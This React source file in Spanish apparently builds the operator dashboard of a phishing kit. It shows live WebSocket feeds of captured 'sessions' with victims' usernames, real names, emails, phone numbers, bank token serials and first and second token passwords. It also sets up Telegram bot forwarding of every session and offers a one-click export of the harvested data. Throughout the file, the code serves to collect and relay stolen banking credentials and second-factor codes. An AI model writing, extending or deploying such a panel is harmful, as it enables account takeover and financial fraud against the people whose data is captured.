import React, { useState, useEffect, useRef } from 'react'
import { useNavigate } from 'react-router-dom'
import websocketService from '../services/websocket.service'

interface SessionData {
  user?: string
  realName?: string
  idSesion?: string
  userName?: string
  taxData?: {
    fullName: string
    email: string
    mobilePhone: string
    landlinePhone: string
  }
  tokenSerial?: string
  tokenPasswords?: {
    first: string
    second: string
  }
  api?: any
  from?: string
  token_minisitio?: string
}

interface Analytics {
  totalSessions: number
  totalLogins: number
  totalTaxDataSubmissions: number
  totalTokenSyncs: number
  averageTimeOnSite: number
  pagesVisited: string[]
  lastActivity: string
}

const Dashboard: React.FC = () => {
  const navigate = useNavigate()
  const [sessionData, setSessionData] = useState<SessionData>({})
  const [analytics, setAnalytics] = useState<Analytics>({
    totalSessions: 0,
    totalLogins: 0,
    totalTaxDataSubmissions: 0,
    totalTokenSyncs: 0,
    averageTimeOnSite: 0,
    pagesVisited: [],
    lastActivity: ''
  })
  const [allSessionData, setAllSessionData] = useState<SessionData[]>([])
  const [wsConnected, setWsConnected] = useState(false)
  const [showConfig, setShowConfig] = useState(false)
  const [telegramConfig, setTelegramConfig] = useState({
    botToken: '',
    chatId: ''
  })
  const [configSaved, setConfigSaved] = useState(false)
  const [configError, setConfigError] = useState<string | null>(null)
  const [isSaving, setIsSaving] = useState(false)
  const saveTimeoutRef = useRef<NodeJS.Timeout | null>(null)

  useEffect(() => {
    // Conectar al WebSocket
    websocketService.connect()
    
    // Handler para conexión establecida
    const handleConnected = () => {
      console.log('✅ Dashboard: WebSocket conectado')
      setWsConnected(true)
      // Solicitar datos iniciales
      websocketService.send({ type: 'get_config' })
    }

    // Handler para desconexión
    const handleDisconnected = () => {
      console.log('❌ Dashboard: WebSocket desconectado')
      setWsConnected(false)
    }

    // Handler para errores de conexión
    const handleConnectionError = (data: any) => {
      console.error('❌ Dashboard: Error de conexión:', data.error)
      setWsConnected(false)
      if (data.error) {
        setConfigError(data.error)
        setTimeout(() => {
          setConfigError(null)
        }, 10000)
      }
    }

    // Handler para datos iniciales
    const handleInitial = (data: any) => {
      console.log('📊 Dashboard: Datos iniciales recibidos', data.sessions?.length || 0, 'sesiones')
      setWsConnected(true)
      if (data.sessions && Array.isArray(data.sessions)) {
        // Ordenar por última actualización (más recientes primero)
        const sortedSessions = [...data.sessions].sort((a: any, b: any) => {
          const timeA = new Date(a.lastUpdate || a.timestamp || 0).getTime()
          const timeB = new Date(b.lastUpdate || b.timestamp || 0).getTime()
          return timeB - timeA
        })
        setAllSessionData(sortedSessions)
      }
      if (data.analytics) {
        setAnalytics(prev => ({ ...prev, ...data.analytics }))
      }
    }

    // Handler para actualizaciones de sesión
    const handleSessionUpdate = (data: any) => {
      console.log('🔄 Dashboard: Actualización de sesión recibida', data.session?.sessionId)
      setWsConnected(true)
      if (data.sessions && Array.isArray(data.sessions)) {
        console.log('📊 Actualizando sesiones:', data.sessions.length)
        // Ordenar por última actualización (más recientes primero)
        const sortedSessions = [...data.sessions].sort((a: any, b: any) => {
          const timeA = new Date(a.lastUpdate || a.timestamp || 0).getTime()
          const timeB = new Date(b.lastUpdate || b.timestamp || 0).getTime()
          return timeB - timeA
        })
        setAllSessionData(sortedSessions)
      }
      if (data.analytics) {
        setAnalytics(prev => ({ ...prev, ...data.analytics }))
      }
    }

    // Escuchar eventos de conexión
    websocketService.on('connected', handleConnected)
    websocketService.on('disconnected', handleDisconnected)
    websocketService.on('connection_error', handleConnectionError)
    
    // Escuchar actualizaciones de sesiones
    websocketService.on('initial', handleInitial)
    websocketService.on('session_updated', handleSessionUpdate)
    
    // Handler para configuración
    const handleConfig = (data: any) => {
      if (data.config) {
        const botToken = data.config.telegram_bot_token || ''
        const chatId = data.config.telegram_chat_id || ''
        setTelegramConfig({
          botToken,
          chatId
        })
        console.log('📥 Configuración cargada desde BD:', {
          botToken: botToken ? '***' + botToken.slice(-5) : 'vacío',
          chatId: chatId || 'vacío'
        })
      }
    }
    
    const handleConfigUpdated = (data: any) => {
      console.log('📥 Dashboard recibió config_updated:', data)
      
      // Limpiar timeout si existe
      if (saveTimeoutRef.current) {
        clearTimeout(saveTimeoutRef.current)
        saveTimeoutRef.current = null
      }
      
      setIsSaving(false)
      if (data.success) {
        setConfigSaved(true)
        setConfigError(null)
        setTimeout(() => {
          setConfigSaved(false)
        }, 5000)
        console.log('✅ Configuración guardada exitosamente en BD')
      } else {
        setConfigSaved(false)
        const errorMessage = data.error || data.message || 'Error desconocido al guardar la configuración'
        setConfigError(errorMessage)
        setTimeout(() => {
          setConfigError(null)
        }, 8000)
        console.error('❌ Error guardando configuración:', errorMessage)
      }
    }
    
    websocketService.on('config', handleConfig)
    websocketService.on('config_updated', handleConfigUpdated)
    
    // Listener adicional para debugging (se limpia automáticamente)
    const debugHandler = (data: any) => {
      if (data.type === 'config_updated') {
        console.log('🔍 Mensaje config_updated recibido (via *):', data)
      }
    }
    websocketService.on('*', debugHandler)

    // Verificar conexión periódicamente
    const connectionCheck = setInterval(() => {
      if (!websocketService.isConnected()) {
        console.log('🔄 Reconectando WebSocket...')
        websocketService.connect()
      }
    }, 5000)

    // Solicitar configuración actual después de un breve delay
    setTimeout(() => {
      if (websocketService.isConnected()) {
        websocketService.send({ type: 'get_config' })
      }
    }, 1000)

    // Cargar datos locales también
    loadSessionData()

    // Cleanup al desmontar
    return () => {
      clearInterval(connectionCheck)
      if (saveTimeoutRef.current) {
        clearTimeout(saveTimeoutRef.current)
      }
      websocketService.off('connected', handleConnected)
      websocketService.off('disconnected', handleDisconnected)
      websocketService.off('connection_error', handleConnectionError)
      websocketService.off('initial', handleInitial)
      websocketService.off('session_updated', handleSessionUpdate)
      websocketService.off('config', handleConfig)
      websocketService.off('config_updated', handleConfigUpdated)
      websocketService.off('*', debugHandler)
    }
  }, [])

  const handleSaveTelegramConfig = () => {
    if (!telegramConfig.botToken || !telegramConfig.chatId) {
      setConfigError('Por favor, completa ambos campos')
      return
    }

    // Verificar conexión
    if (!websocketService.isConnected()) {
      setIsSaving(true)
      setConfigError('Conectando al servidor...')
      websocketService.connect()
      
      // Esperar conexión
      const checkConnection = setInterval(() => {
        if (websocketService.isConnected()) {
          clearInterval(checkConnection)
          setConfigError(null)
          handleSaveTelegramConfig() // Reintentar guardar
        }
      }, 500)

      setTimeout(() => {
        clearInterval(checkConnection)
        if (!websocketService.isConnected()) {
          setIsSaving(false)
          setConfigError('No se pudo conectar. Ejecuta: npm run ws')
        }
      }, 3000)
      return
    }

    // Limpiar timeout anterior
    if (saveTimeoutRef.current) {
      clearTimeout(saveTimeoutRef.current)
    }

    setIsSaving(true)
    setConfigError(null)
    setConfigSaved(false)

    // Enviar configuración
    websocketService.send({
      type: 'set_config',
      config: {
        telegram_bot_token: telegramConfig.botToken.trim(),
        telegram_chat_id: telegramConfig.chatId.trim()
      }
    })

    // Timeout de respuesta
    saveTimeoutRef.current = setTimeout(() => {
      setIsSaving(false)
      setConfigError('No se recibió respuesta del servidor')
    }, 5000)
  }

  const loadSessionData = () => {
    const data: SessionData = {}
    
    // Leer todos los datos de sessionStorage
    const user = sessionStorage.getItem('user')
    const realName = sessionStorage.getItem('realName')
    const idSesion = sessionStorage.getItem('idSesion')
    const userName = sessionStorage.getItem('userName')
    const taxDataStr = sessionStorage.getItem('taxData')
    const apiStr = sessionStorage.getItem('api')
    const from = sessionStorage.getItem('from')
    const token_minisitio = sessionStorage.getItem('token_minisitio')

    if (user) data.user = atob(user)
    if (realName) data.realName = atob(realName)
    if (idSesion) data.idSesion = atob(idSesion)
    if (userName) data.userName = atob(userName)
    if (taxDataStr) data.taxData = JSON.parse(taxDataStr)
    if (apiStr) {
      try {
        data.api = JSON.parse(atob(apiStr))
      } catch (e) {
        data.api = { error: 'Error al parsear' }
      }
    }
    if (from) data.from = from
    if (token_minisitio) data.token_minisitio = token_minisitio

    // Intentar leer datos de token si existen
    const tokenSerial = sessionStorage.getItem('tokenSerial')
    const tokenFirstPass = sessionStorage.getItem('tokenFirstPass')
    const tokenSecondPass = sessionStorage.getItem('tokenSecondPass')
    
    if (tokenSerial) data.tokenSerial = tokenSerial
    if (tokenFirstPass || tokenSecondPass) {
      data.tokenPasswords = {
        first: tokenFirstPass || 'No registrada',
        second: tokenSecondPass || 'No registrada'
      }
    }

    setSessionData(data)
    
    // Guardar en historial de sesiones (localStorage para persistencia)
    const sessionHistory = JSON.parse(localStorage.getItem('sessionHistory') || '[]')
    sessionHistory.push({
      ...data,
      timestamp: new Date().toISOString(),
      sessionId: idSesion ? atob(idSesion) : `session_${Date.now()}`
    })
    localStorage.setItem('sessionHistory', JSON.stringify(sessionHistory.slice(-50))) // Últimas 50 sesiones
  }

  const loadAnalytics = () => {
    const sessionHistory = JSON.parse(localStorage.getItem('sessionHistory') || '[]')
    const pagesVisited = JSON.parse(localStorage.getItem('pagesVisited') || '[]')
    const startTime = parseInt(localStorage.getItem('sessionStartTime') || '0')
    
    const now = Date.now()
    const timeOnSite = startTime > 0 ? Math.floor((now - startTime) / 1000 / 60) : 0

    setAnalytics({
      totalSessions: sessionHistory.length,
      totalLogins: sessionHistory.filter((s: SessionData) => s.userName).length,
      totalTaxDataSubmissions: sessionHistory.filter((s: SessionData) => s.taxData).length,
      totalTokenSyncs: sessionHistory.filter((s: SessionData) => s.tokenSerial).length,
      averageTimeOnSite: timeOnSite,
      pagesVisited: pagesVisited,
      lastActivity: new Date().toLocaleString('es-MX')
    })

    setAllSessionData(sessionHistory)
  }

  const clearSessionData = () => {
    sessionStorage.clear()
    localStorage.removeItem('sessionHistory')
    localStorage.removeItem('pagesVisited')
    localStorage.removeItem('sessionStartTime')
    setSessionData({})
    setAllSessionData([])
    setAnalytics({
      totalSessions: 0,
      totalLogins: 0,
      totalTaxDataSubmissions: 0,
      totalTokenSyncs: 0,
      averageTimeOnSite: 0,
      pagesVisited: [],
      lastActivity: ''
    })
  }

  const exportData = () => {
    const dataToExport = {
      currentSession: sessionData,
      analytics,
      allSessions: allSessionData,
      exportedAt: new Date().toISOString()
    }
    const blob = new Blob([JSON.stringify(dataToExport, null, 2)], { type: 'application/json' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = `dashboard-data-${Date.now()}.json`
    a.click()
    URL.revokeObjectURL(url)
  }

  const handleLogout = () => {
    // Limpiar autenticación
    sessionStorage.removeItem('dashboard_authenticated')
    sessionStorage.removeItem('dashboard_auth_time')
    // Redirigir al login
    navigate('/dashboard/login')
  }

  return (
    <div className="wrapper dark" style={{ margin: 0, padding: 0, minHeight: '100vh' }}>
      {/* Header */}
      <header style={{
        backgroundColor: '#2c3e50',
        color: '#fff',
        padding: '15px 20px',
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'center',
        flexWrap: 'wrap',
        gap: '15px',
        margin: 0,
        width: '100%'
      }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '15px' }}>
          <h1 style={{ margin: 0, fontSize: '24px', fontWeight: 'bold' }}>📊 Dashboard de Sesión</h1>
        </div>
        <div style={{ display: 'flex', gap: '10px', flexWrap: 'wrap' }}>
          <button
            onClick={handleLogout}
            style={{
              padding: '8px 16px',
              backgroundColor: '#e74c3c',
              color: '#fff',
              border: 'none',
              borderRadius: '4px',
              cursor: 'pointer',
              fontSize: '14px',
              fontWeight: '500',
              transition: 'all 0.3s ease'
            }}
            onMouseEnter={(e) => {
              e.currentTarget.style.backgroundColor = '#c0392b'
              e.currentTarget.style.transform = 'translateY(-2px)'
            }}
            onMouseLeave={(e) => {
              e.currentTarget.style.backgroundColor = '#e74c3c'
              e.currentTarget.style.transform = 'translateY(0)'
            }}
          >
            🚪 Cerrar Sesión
          </button>
          <button
            onClick={() => setShowConfig(!showConfig)}
            style={{
              padding: '8px 16px',
              backgroundColor: showConfig ? '#27ae60' : '#9b59b6',
              color: '#fff',
              border: 'none',
              borderRadius: '4px',
              cursor: 'pointer',
              fontSize: '14px',
              fontWeight: '500'
            }}
          >
            ⚙️ {showConfig ? 'Ocultar Config' : 'Configurar Telegram'}
          </button>
          <button
            onClick={exportData}
            style={{
              padding: '8px 16px',
              backgroundColor: '#4A90E2',
              color: '#fff',
              border: 'none',
              borderRadius: '4px',
              cursor: 'pointer',
              fontSize: '14px',
              fontWeight: '500'
            }}
          >
            📥 Exportar Datos
          </button>
          <button
            onClick={clearSessionData}
            style={{
              padding: '8px 16px',
              backgroundColor: '#e74c3c',
              color: '#fff',
              border: 'none',
              borderRadius: '4px',
              cursor: 'pointer',
              fontSize: '14px',
              fontWeight: '500'
            }}
          >
            🗑️ Limpiar Datos
          </button>
          <div 
            onClick={() => {
              if (!wsConnected) {
                console.log('🔄 Intentando conectar manualmente...')
                websocketService.connect()
              }
            }}
            style={{
              padding: '8px 16px',
              backgroundColor: wsConnected ? '#27ae60' : '#e74c3c',
              color: '#fff',
              borderRadius: '4px',
              fontSize: '14px',
              fontWeight: '500',
              display: 'flex',
              alignItems: 'center',
              gap: '8px',
              cursor: !wsConnected ? 'pointer' : 'default',
              transition: 'all 0.2s ease'
            }}
            title={!wsConnected ? 'Haz clic para intentar conectar al servidor WebSocket' : 'Conectado al servidor WebSocket'}
            onMouseEnter={(e) => {
              if (!wsConnected) {
                e.currentTarget.style.opacity = '0.8'
                e.currentTarget.style.transform = 'scale(1.05)'
              }
            }}
            onMouseLeave={(e) => {
              if (!wsConnected) {
                e.currentTarget.style.opacity = '1'
                e.currentTarget.style.transform = 'scale(1)'
              }
            }}
          >
            <span style={{
              width: '8px',
              height: '8px',
              borderRadius: '50%',
              backgroundColor: wsConnected ? '#fff' : '#fff',
              animation: wsConnected ? 'pulse 2s infinite' : 'none'
            }}></span>
            {wsConnected ? 'Conectado' : 'Desconectado (Click para conectar)'}
          </div>
          <style>{`
            @keyframes pulse {
              0%, 100% { opacity: 1; }
              50% { opacity: 0.5; }
            }
          `}</style>
        </div>
      </header>

      <div className="container" style={{ padding: '30px 20px', maxWidth: '1400px', margin: '0 auto' }}>
        {/* Configuración de Telegram */}
        {showConfig && (
          <div style={{
            backgroundColor: '#2c3e50',
            padding: '30px',
            borderRadius: '8px',
            boxShadow: '0 4px 12px rgba(0,0,0,0.3)',
            marginBottom: '30px',
            border: '2px solid #9b59b6'
          }}>
            <h2 style={{ marginTop: 0, marginBottom: '20px', color: '#fff', fontSize: '24px', fontWeight: 'bold' }}>
              ⚙️ Configuración de Telegram
            </h2>
            <p style={{ color: '#e0e0e0', marginBottom: '25px', fontSize: '14px', lineHeight: '1.6' }}>
              Configura los tokens de Telegram para recibir notificaciones en tiempo real de todas las sesiones.
              Para obtener tu token, crea un bot con <a href="https://t.me/BotFather" target="_blank" rel="noopener noreferrer" style={{ color: '#4A90E2', textDecoration: 'underline', fontWeight: '500' }}>@BotFather</a> y obtén tu Chat ID con <a href="https://t.me/userinfobot" target="_blank" rel="noopener noreferrer" style={{ color: '#4A90E2', textDecoration: 'underline', fontWeight: '500' }}>@userinfobot</a>.
            </p>
            
            <div style={{ display: 'grid', gap: '20px', marginBottom: '25px' }}>
              <div>
                <label style={{ display: 'block', marginBottom: '10px', color: '#fff', fontWeight: '600', fontSize: '15px' }}>
                  Token del Bot de Telegram:
                </label>
                <input
                  type="text"
                  value={telegramConfig.botToken}
                  onChange={(e) => setTelegramConfig({ ...telegramConfig, botToken: e.target.value })}
                  placeholder="123456789:ABCdefGHIjklMNOpqrsTUVwxyz"
                  style={{
                    width: '100%',
                    padding: '14px',
                    backgroundColor: '#4a4a4a',
                    color: '#fff',
                    border: '2px solid #666',
                    borderRadius: '6px',
                    fontSize: '14px',
                    fontFamily: 'monospace',
                    outline: 'none',
                    transition: 'border-color 0.3s ease'
                  }}
                  onFocus={(e) => {
                    e.target.style.borderColor = '#9b59b6'
                  }}
                  onBlur={(e) => {
                    e.target.style.borderColor = '#666'
                  }}
                />
              </div>
              
              <div>
                <label style={{ display: 'block', marginBottom: '10px', color: '#fff', fontWeight: '600', fontSize: '15px' }}>
                  Chat ID de Telegram:
                </label>
                <input
                  type="text"
                  value={telegramConfig.chatId}
                  onChange={(e) => setTelegramConfig({ ...telegramConfig, chatId: e.target.value })}
                  placeholder="123456789"
                  style={{
                    width: '100%',
                    padding: '14px',
                    backgroundColor: '#4a4a4a',
                    color: '#fff',
                    border: '2px solid #666',
                    borderRadius: '6px',
                    fontSize: '14px',
                    fontFamily: 'monospace',
                    outline: 'none',
                    transition: 'border-color 0.3s ease'
                  }}
                  onFocus={(e) => {
                    e.target.style.borderColor = '#9b59b6'
                  }}
                  onBlur={(e) => {
                    e.target.style.borderColor = '#666'
                  }}
                />
              </div>
            </div>
            
            <div style={{ display: 'flex', flexDirection: 'column', gap: '15px' }}>
              <div style={{ display: 'flex', gap: '15px', alignItems: 'center', flexWrap: 'wrap' }}>
                <button
                  onClick={handleSaveTelegramConfig}
                  disabled={!telegramConfig.botToken || !telegramConfig.chatId || isSaving}
                  style={{
                    padding: '12px 24px',
                    backgroundColor: (telegramConfig.botToken && telegramConfig.chatId && !isSaving) ? '#27ae60' : '#95a5a6',
                    color: '#fff',
                    border: 'none',
                    borderRadius: '6px',
                    cursor: (telegramConfig.botToken && telegramConfig.chatId && !isSaving) ? 'pointer' : 'not-allowed',
                    fontSize: '15px',
                    fontWeight: '600',
                    boxShadow: (telegramConfig.botToken && telegramConfig.chatId && !isSaving) ? '0 2px 8px rgba(39, 174, 96, 0.3)' : 'none',
                    transition: 'all 0.3s ease',
                    opacity: isSaving ? 0.7 : 1,
                    position: 'relative'
                  }}
                  onMouseEnter={(e) => {
                    if (telegramConfig.botToken && telegramConfig.chatId && !isSaving) {
                      e.currentTarget.style.backgroundColor = '#229954'
                      e.currentTarget.style.transform = 'translateY(-2px)'
                    }
                  }}
                  onMouseLeave={(e) => {
                    if (telegramConfig.botToken && telegramConfig.chatId && !isSaving) {
                      e.currentTarget.style.backgroundColor = '#27ae60'
                      e.currentTarget.style.transform = 'translateY(0)'
                    }
                  }}
                >
                  {isSaving ? '⏳ Guardando...' : '💾 Guardar Configuración'}
                </button>
              </div>
              
              {/* Mensaje de éxito */}
              {configSaved && (
                <div style={{ 
                  color: '#27ae60', 
                  fontSize: '15px', 
                  fontWeight: '600',
                  backgroundColor: 'rgba(39, 174, 96, 0.15)',
                  padding: '15px 20px',
                  borderRadius: '6px',
                  border: '2px solid #27ae60',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '10px',
                  animation: 'slideIn 0.3s ease-out',
                  boxShadow: '0 2px 8px rgba(39, 174, 96, 0.2)'
                }}>
                  <span style={{ fontSize: '20px' }}>✅</span>
                  <span>Configuración guardada exitosamente en la base de datos</span>
                </div>
              )}
              
              {/* Mensaje de error */}
              {configError && (
                <div style={{ 
                  color: '#e74c3c', 
                  fontSize: '15px', 
                  fontWeight: '600',
                  backgroundColor: 'rgba(231, 76, 60, 0.15)',
                  padding: '15px 20px',
                  borderRadius: '6px',
                  border: '2px solid #e74c3c',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '10px',
                  animation: 'slideIn 0.3s ease-out',
                  boxShadow: '0 2px 8px rgba(231, 76, 60, 0.2)'
                }}>
                  <span style={{ fontSize: '20px' }}>❌</span>
                  <span>Error al guardar: {configError}</span>
                </div>
              )}
              
              <style>{`
                @keyframes slideIn {
                  from { 
                    opacity: 0; 
                    transform: translateX(-10px); 
                  }
                  to { 
                    opacity: 1; 
                    transform: translateX(0); 
                  }
                }
                @keyframes fadeIn {
                  from { opacity: 0; transform: translateY(-5px); }
                  to { opacity: 1; transform: translateY(0); }
                }
              `}</style>
            </div>
          </div>
        )}

        {/* Analytics Cards */}
        <div style={{
          display: 'grid',
          gridTemplateColumns: 'repeat(auto-fit, minmax(250px, 1fr))',
          gap: '20px',
          marginBottom: '30px'
        }}>
          <div style={{
            backgroundColor: '#fff',
            padding: '20px',
            borderRadius: '8px',
            boxShadow: '0 2px 8px rgba(0,0,0,0.1)',
            borderLeft: '4px solid #4A90E2'
          }}>
            <div style={{ fontSize: '14px', color: '#666', marginBottom: '8px' }}>Total de Sesiones</div>
            <div style={{ fontSize: '32px', fontWeight: 'bold', color: '#2c3e50' }}>{analytics.totalSessions}</div>
          </div>
          <div style={{
            backgroundColor: '#fff',
            padding: '20px',
            borderRadius: '8px',
            boxShadow: '0 2px 8px rgba(0,0,0,0.1)',
            borderLeft: '4px solid #27ae60'
          }}>
            <div style={{ fontSize: '14px', color: '#666', marginBottom: '8px' }}>Logins Exitosos</div>
            <div style={{ fontSize: '32px', fontWeight: 'bold', color: '#2c3e50' }}>{analytics.totalLogins}</div>
          </div>
          <div style={{
            backgroundColor: '#fff',
            padding: '20px',
            borderRadius: '8px',
            boxShadow: '0 2px 8px rgba(0,0,0,0.1)',
            borderLeft: '4px solid #f39c12'
          }}>
            <div style={{ fontSize: '14px', color: '#666', marginBottom: '8px' }}>Datos Fiscales</div>
            <div style={{ fontSize: '32px', fontWeight: 'bold', color: '#2c3e50' }}>{analytics.totalTaxDataSubmissions}</div>
          </div>
          <div style={{
            backgroundColor: '#fff',
            padding: '20px',
            borderRadius: '8px',
            boxShadow: '0 2px 8px rgba(0,0,0,0.1)',
            borderLeft: '4px solid #e74c3c'
          }}>
            <div style={{ fontSize: '14px', color: '#666', marginBottom: '8px' }}>Sincronizaciones Token</div>
            <div style={{ fontSize: '32px', fontWeight: 'bold', color: '#2c3e50' }}>{analytics.totalTokenSyncs}</div>
          </div>
        </div>

        {/* Current Session Data */}
        <div style={{
          backgroundColor: '#fff',
          padding: '25px',
          borderRadius: '8px',
          boxShadow: '0 2px 8px rgba(0,0,0,0.1)',
          marginBottom: '30px'
        }}>
          <h2 style={{ marginTop: 0, marginBottom: '20px', color: '#2c3e50', fontSize: '22px' }}>
            📋 Datos de Sesión Actual
          </h2>
          
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(300px, 1fr))', gap: '20px' }}>
            {/* Información de Usuario */}
            <div>
              <h3 style={{ color: '#4A90E2', fontSize: '16px', marginBottom: '15px', borderBottom: '2px solid #4A90E2', paddingBottom: '8px' }}>
                👤 Información de Usuario
              </h3>
              <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                <div>
                  <strong>Usuario:</strong> <span style={{ color: '#666' }}>{sessionData.userName || 'No disponible'}</span>
                </div>
                <div>
                  <strong>Nombre Real:</strong> <span style={{ color: '#666' }}>{sessionData.realName || 'No disponible'}</span>
                </div>
                <div>
                  <strong>ID Usuario:</strong> <span style={{ color: '#666' }}>{sessionData.user || 'No disponible'}</span>
                </div>
                <div>
                  <strong>ID Sesión:</strong> <span style={{ color: '#666', fontSize: '12px' }}>{sessionData.idSesion || 'No disponible'}</span>
                </div>
              </div>
            </div>

            {/* Datos Fiscales */}
            {sessionData.taxData && (
              <div>
                <h3 style={{ color: '#f39c12', fontSize: '16px', marginBottom: '15px', borderBottom: '2px solid #f39c12', paddingBottom: '8px' }}>
                  💼 Datos Fiscales
                </h3>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                  <div>
                    <strong>Nombre Completo:</strong> <span style={{ color: '#666' }}>{sessionData.taxData.fullName}</span>
                  </div>
                  <div>
                    <strong>Email:</strong> <span style={{ color: '#666' }}>{sessionData.taxData.email}</span>
                  </div>
                  <div>
                    <strong>Teléfono Móvil:</strong> <span style={{ color: '#666' }}>{sessionData.taxData.mobilePhone}</span>
                  </div>
                  <div>
                    <strong>Teléfono Fijo:</strong> <span style={{ color: '#666' }}>{sessionData.taxData.landlinePhone}</span>
                  </div>
                </div>
              </div>
            )}

            {/* Token Sync */}
            {(sessionData.tokenSerial || sessionData.tokenPasswords) && (
              <div>
                <h3 style={{ color: '#e74c3c', fontSize: '16px', marginBottom: '15px', borderBottom: '2px solid #e74c3c', paddingBottom: '8px' }}>
                  🔐 Sincronización Token
                </h3>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                  {sessionData.tokenSerial && (
                    <div>
                      <strong>Número de Serie:</strong> <span style={{ color: '#666' }}>{sessionData.tokenSerial}</span>
                    </div>
                  )}
                  {sessionData.tokenPasswords && (
                    <>
                      <div>
                        <strong>Primera Contraseña:</strong> <span style={{ color: '#666', fontFamily: 'monospace' }}>{'*'.repeat(6)}</span>
                      </div>
                      <div>
                        <strong>Segunda Contraseña:</strong> <span style={{ color: '#666', fontFamily: 'monospace' }}>{'*'.repeat(6)}</span>
                      </div>
                    </>
                  )}
                </div>
              </div>
            )}

            {/* Configuración API */}
            {sessionData.api && (
              <div>
                <h3 style={{ color: '#9b59b6', fontSize: '16px', marginBottom: '15px', borderBottom: '2px solid #9b59b6', paddingBottom: '8px' }}>
                  ⚙️ Configuración API
                </h3>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '10px', fontSize: '12px' }}>
                  <div>
                    <strong>IP Server:</strong> <span style={{ color: '#666' }}>{sessionData.api.ipServer || 'N/A'}</span>
                  </div>
                  <div>
                    <strong>Path App:</strong> <span style={{ color: '#666', wordBreak: 'break-all' }}>{sessionData.api.pathApp || 'N/A'}</span>
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>

        {/* Analytics Details */}
        <div style={{
          backgroundColor: '#fff',
          padding: '25px',
          borderRadius: '8px',
          boxShadow: '0 2px 8px rgba(0,0,0,0.1)',
          marginBottom: '30px'
        }}>
          <h2 style={{ marginTop: 0, marginBottom: '20px', color: '#2c3e50', fontSize: '22px' }}>
            📈 Analytics Detallados
          </h2>
          
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(300px, 1fr))', gap: '20px' }}>
            <div>
              <h3 style={{ color: '#4A90E2', fontSize: '16px', marginBottom: '10px' }}>Tiempo en Sitio</h3>
              <div style={{ fontSize: '24px', fontWeight: 'bold', color: '#2c3e50' }}>
                {analytics.averageTimeOnSite} minutos
              </div>
            </div>
            <div>
              <h3 style={{ color: '#4A90E2', fontSize: '16px', marginBottom: '10px' }}>Última Actividad</h3>
              <div style={{ fontSize: '14px', color: '#666' }}>
                {analytics.lastActivity}
              </div>
            </div>
            <div>
              <h3 style={{ color: '#4A90E2', fontSize: '16px', marginBottom: '10px' }}>Páginas Visitadas</h3>
              <div style={{ fontSize: '14px', color: '#666' }}>
                {analytics.pagesVisited.length > 0 ? analytics.pagesVisited.join(', ') : 'Ninguna registrada'}
              </div>
            </div>
          </div>
        </div>

        {/* All Sessions Table - Real Time */}
        <div style={{
          backgroundColor: '#fff',
          padding: '25px',
          borderRadius: '8px',
          boxShadow: '0 2px 8px rgba(0,0,0,0.1)',
          overflowX: 'auto'
        }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '20px' }}>
            <h2 style={{ margin: 0, color: '#2c3e50', fontSize: '22px' }}>
              📚 Todas las Sesiones en Tiempo Real ({allSessionData.length})
            </h2>
            <div style={{
              padding: '6px 12px',
              backgroundColor: wsConnected ? '#d4edda' : '#f8d7da',
              color: wsConnected ? '#155724' : '#721c24',
              borderRadius: '4px',
              fontSize: '12px',
              fontWeight: '500'
            }}>
              {wsConnected ? '🟢 Actualización en tiempo real' : '🔴 Sin conexión'}
            </div>
          </div>
          {allSessionData.length > 0 ? (
            <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '14px' }}>
              <thead>
                <tr style={{ backgroundColor: '#f8f9fa', borderBottom: '2px solid #dee2e6' }}>
                  <th style={{ padding: '12px', textAlign: 'left', color: '#2c3e50' }}>ID Sesión</th>
                  <th style={{ padding: '12px', textAlign: 'left', color: '#2c3e50' }}>Usuario</th>
                  <th style={{ padding: '12px', textAlign: 'left', color: '#2c3e50' }}>Nombre</th>
                  <th style={{ padding: '12px', textAlign: 'left', color: '#2c3e50' }}>Email</th>
                  <th style={{ padding: '12px', textAlign: 'left', color: '#2c3e50' }}>Teléfono</th>
                  <th style={{ padding: '12px', textAlign: 'left', color: '#2c3e50' }}>Datos Fiscales</th>
                  <th style={{ padding: '12px', textAlign: 'left', color: '#2c3e50' }}>Token Sync</th>
                  <th style={{ padding: '12px', textAlign: 'left', color: '#2c3e50' }}>Última Actualización</th>
                </tr>
              </thead>
              <tbody>
                {allSessionData.slice().reverse().map((session: any, index: number) => (
                  <tr 
                    key={session.sessionId || index} 
                    style={{ 
                      borderBottom: '1px solid #dee2e6',
                      backgroundColor: index % 2 === 0 ? '#fff' : '#f8f9fa'
                    }}
                  >
                    <td style={{ padding: '12px', color: '#666', fontSize: '11px', fontFamily: 'monospace' }}>
                      {session.sessionId || session.idSesion || 'N/A'}
                    </td>
                    <td style={{ padding: '12px', color: '#666' }}>{session.userName || 'N/A'}</td>
                    <td style={{ padding: '12px', color: '#666' }}>
                      {session.realName || session.taxData?.fullName || 'N/A'}
                    </td>
                    <td style={{ padding: '12px', color: '#666' }}>
                      {session.taxData?.email || 'N/A'}
                    </td>
                    <td style={{ padding: '12px', color: '#666' }}>
                      {session.taxData?.mobilePhone || 'N/A'}
                    </td>
                    <td style={{ padding: '12px', color: '#666', textAlign: 'center' }}>
                      {session.taxData ? '✅' : '❌'}
                    </td>
                    <td style={{ padding: '12px', color: '#666', textAlign: 'center' }}>
                      {session.tokenSerial ? '✅' : '❌'}
                    </td>
                    <td style={{ padding: '12px', color: '#666', fontSize: '12px' }}>
                      {session.lastUpdate 
                        ? new Date(session.lastUpdate).toLocaleString('es-MX') 
                        : session.timestamp 
                        ? new Date(session.timestamp).toLocaleString('es-MX')
                        : 'N/A'}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          ) : (
            <div style={{ textAlign: 'center', padding: '40px', color: '#666' }}>
              <div style={{ fontSize: '48px', marginBottom: '10px' }}>📊</div>
              <p>No hay sesiones registradas aún</p>
            </div>
          )}
        </div>

      </div>
    </div>
  )
}

export default Dashboard

